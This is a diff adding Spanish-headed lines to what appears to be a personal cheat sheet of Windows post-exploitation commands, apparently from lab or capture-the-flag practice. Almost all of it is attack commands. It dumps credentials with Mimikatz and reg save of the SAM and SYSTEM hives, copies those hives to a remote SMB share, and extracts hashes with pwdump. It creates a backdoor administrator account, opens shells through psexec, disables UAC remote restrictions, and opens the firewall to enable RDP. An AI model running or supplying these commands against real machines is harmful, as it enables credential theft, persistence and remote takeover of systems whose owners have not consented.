@@ -16,3 +16,42 @@ DUMPEO DE HASHES CON MIMIKATZ
 privilege::debug
 token::elevate
 lsadump::sam
+
+
+
+
+# LISTAR GRUPOS LOCALES
+net localgroup
+
+# COPY SAM SYSTEM
+copy sam.copy \\10.9.102.237\smbFolder\sam
+copy system.copy \\10.9.102.237\smbFolder\system
+
+#OBTNER HASHES
+python pwdump.py ../system ../sam
+
+# CREAR UN USUARIO EN CMD
+net user haxor haxor123 /add
+
+# AÑADIR AL GRUPO ADMINISTRTORS (LOCAL)
+net localgroup "Administrators" haxor /add
+
+# CONECTANDO A UN USUARIO VIA PSEXEC
+psexec.py workgroup/haxor:haxor123@10.10.27.87 cmd.exe
+psexec.py workgroup/noroot:noroot1@10.10.27.87 cmd.exe
+
+# OBTENCION DE HASHES SAM
+reg save HKLM\SAM sam.backup
+reg save HKLM\SYSTEM system.backup
+
+# LISTAR EL PESO CADA SEG.
+watch -n 1 du -hc system.backu
+
+
+#  VIA RDP (PWN3D)
+net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+netsh advfirewall firewall add rule name="RDP port" protocol=TCP dir=in localport=3389 action=allow
+netsh advfirewall firewall add rule name="RDP port" protocol=TCP dir=out localport=3389 action=allow
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
